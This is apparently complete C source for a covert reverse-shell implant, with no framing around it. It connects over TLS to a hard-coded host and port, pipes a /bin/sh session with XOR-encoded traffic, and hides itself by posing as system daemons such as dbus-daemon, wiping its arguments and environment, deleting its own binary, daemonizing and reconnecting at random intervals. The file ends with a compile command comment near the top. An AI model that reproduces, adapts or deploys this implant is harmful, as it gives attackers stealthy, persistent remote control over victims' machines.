#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

//gcc -O3 -Wall -fPIC -s rs_tcpssl.c -lssl -lcrypto -o rs10
//strip --strip-unneeded rs10


// Settings
#define SERVER_IP "192.168.56.1"
#define SERVER_PORT 4445

// Globals
int RECONNECT_DELAY;
char PROCESS_NAME[64];
const char *xor_key = "sneaky_key"; // XOR encryption key

// Prototypes
void sigchld_handler(int s);
void daemonize();
void set_process_name(const char *name);
void randomize_settings();
void hide_process(int argc, char *argv[], char *envp[]);
void self_delete(const char *path);
void xor_encrypt_decrypt(char *data, size_t len, const char *key, size_t keylen);
void spawn_encoded_shell_ssl(SSL *ssl);
void init_openssl();
void cleanup_openssl();

// Handlers
void sigchld_handler(int s) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

// Detach from terminal
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int i = 0; i < 3; i++) close(i);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_RDWR);
    open("/dev/null", O_RDWR);
}

// Set thread/process name
void set_process_name(const char *name) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
}

// Randomize reconnect delay and fake process name
void randomize_settings() {
    srand(time(NULL) ^ getpid());

    RECONNECT_DELAY = (rand() % 9) + 2; // 2-10 seconds

    const char *names[] = {
        "systemd-timesyncd", "dbus-daemon", "polkitd", "cron",
        "avahi-daemon", "rsyslogd", "ssh-agent", "gvfsd",
        "udisksd", "upowerd", "NetworkManager"
    };
    int idx = rand() % (sizeof(names) / sizeof(names[0]));
    strncpy(PROCESS_NAME, names[idx], sizeof(PROCESS_NAME) - 1);
    PROCESS_NAME[sizeof(PROCESS_NAME) - 1] = '\0';
}

// Hide argv[] and envp[]
void hide_process(int argc, char *argv[], char *envp[]) {
    size_t argv0_len = strlen(argv[0]);
    memset(argv[0], 0, argv0_len);

    size_t copy_len = strlen(PROCESS_NAME);
    if (copy_len >= argv0_len) copy_len = argv0_len - 1;
    strncpy(argv[0], PROCESS_NAME, copy_len);
    argv[0][argv0_len - 1] = '\0';

    for (int i = 1; i < argc; i++) {
        if (argv[i])
            memset(argv[i], 0, strlen(argv[i]));
    }

    for (char **env = envp; *env != 0; env++) {
        memset(*env, 0, strlen(*env));
    }
}

// Delete own binary
void self_delete(const char *path) {
    unlink(path);
}

// XOR encryption/decryption
void xor_encrypt_decrypt(char *data, size_t len, const char *key, size_t keylen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}

// SSL spawn shell
void spawn_encoded_shell_ssl(SSL *ssl) {
    int in_pipe[2], out_pipe[2];
    pid_t pid;

    if (pipe(in_pipe) < 0 || pipe(out_pipe) < 0) exit(EXIT_FAILURE);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);

    if (pid == 0) {
        // Child
        dup2(in_pipe[0], STDIN_FILENO);
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(out_pipe[1], STDERR_FILENO);

        close(in_pipe[1]);
        close(out_pipe[0]);

        execl("/bin/sh", "sh", NULL);
        exit(EXIT_FAILURE);
    } else {
        // Parent
        close(in_pipe[0]);
        close(out_pipe[1]);

        fd_set fds;
        char buffer[4096];
        int n;


        while (1) {
            FD_ZERO(&fds);
            int ssl_fd = SSL_get_fd(ssl);
            FD_SET(ssl_fd, &fds);
            FD_SET(out_pipe[0], &fds);

            int maxfd = (ssl_fd > out_pipe[0]) ? ssl_fd : out_pipe[0];

            if (select(maxfd + 1, &fds, NULL, NULL, NULL) < 0) break;

            if (FD_ISSET(ssl_fd, &fds)) {
                n = SSL_read(ssl, buffer, sizeof(buffer));
                if (n <= 0) break;
                xor_encrypt_decrypt(buffer, n, xor_key, strlen(xor_key));
                write(in_pipe[1], buffer, n);
            }

            if (FD_ISSET(out_pipe[0], &fds)) {
                n = read(out_pipe[0], buffer, sizeof(buffer));
                if (n <= 0) break;
                xor_encrypt_decrypt(buffer, n, xor_key, strlen(xor_key));
                SSL_write(ssl, buffer, n);
            }
        }

        close(in_pipe[1]);
        close(out_pipe[0]);
        waitpid(pid, NULL, 0);
    }
}

// OpenSSL init
void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// OpenSSL cleanup
void cleanup_openssl() {
    EVP_cleanup();
}

// Main
int main(int argc, char *argv[], char *envp[]) {
    randomize_settings();
    hide_process(argc, argv, envp);
    self_delete(argv[0]);
    daemonize();
    set_process_name(PROCESS_NAME);
    signal(SIGCHLD, sigchld_handler);
    init_openssl();

    int sockfd;
    struct sockaddr_in server_addr;
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) exit(EXIT_FAILURE);

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(RECONNECT_DELAY);
            continue;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sockfd);

            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                close(sockfd);
                sleep(RECONNECT_DELAY);
                continue;
            }

            pid_t pid = fork();
            if (pid == 0) {
                spawn_encoded_shell_ssl(ssl);
                SSL_free(ssl);
                exit(0);
            } else if (pid > 0) {
                close(sockfd);
                waitpid(pid, NULL, 0);
            } else {
                close(sockfd);
            }
        } else {
            close(sockfd);
            sleep(RECONNECT_DELAY);
        }
    }

    cleanup_openssl();
    return 0;
}
